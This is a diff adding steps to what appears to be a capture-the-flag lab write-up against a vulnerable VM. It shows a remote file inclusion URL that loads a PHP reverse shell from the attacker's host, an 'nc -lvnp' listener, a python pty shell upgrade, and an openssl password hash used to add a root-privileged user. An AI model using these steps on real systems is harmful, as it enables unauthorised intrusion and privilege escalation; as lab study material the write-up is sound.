@@ -38,19 +38,30 @@ http://192.168.73.147/connect.php?file=/etc/passwd
 
 
 
+# After than i simply look onto RFI vulnarebility which actually it shows , so i begin dig in
+FIRSTLY :: i've to generate a reverse shell so i downloaded the file called php-reverse-shell/php 
+           then i simply edited my own ip and port will be 1234 
+           ![2024-09-17_12-35](https://github.com/user-attachments/assets/a65b7aeb-f543-4e13-96d2-a81d77765425)
 
+2ND-LY  :: I've type in url {{http://192.168.73.147/connect.php?file=http://192.168.73.129:5000/php-reverse-shell.php}}
+THIRDL-LY :: equivalently i use nc -lvnp 1234 for getting the shell  
+             
+![2024-09-17_12-44](https://github.com/user-attachments/assets/98c2a376-7627-4b56-aa13-be0638b70219)
 
+  FINALLY get the shell but not in interactive mode
+  so i use python script to generate-interactive mode using 
+   [python3 -c "import pty;pty.spawn('/bin/bash') ;" ]
+  succesfully in interactive mode 
+  but not accessing in root so, performing previledge-escalation  
+  # FOr that instance i've to create a openssl session and also genareting hash for our new user and gettin also with root previledges 
+                                               {openssl passwd -1 -salt user HA:ISRO}
+ 
 
+   ![2024-09-17_12-54](https://github.com/user-attachments/assets/782b7a8d-7892-4d0d-8d98-9ce0bcccfcd1)
 
+  ![2024-09-17_12-58](https://github.com/user-attachments/assets/aa2c15a7-995d-4db5-9f12-91737df53902)
 
-
-
-
-
-
-
-
-
+  now i've  create a user called darkey and passwd will be-HA:ISRO
 
 
 
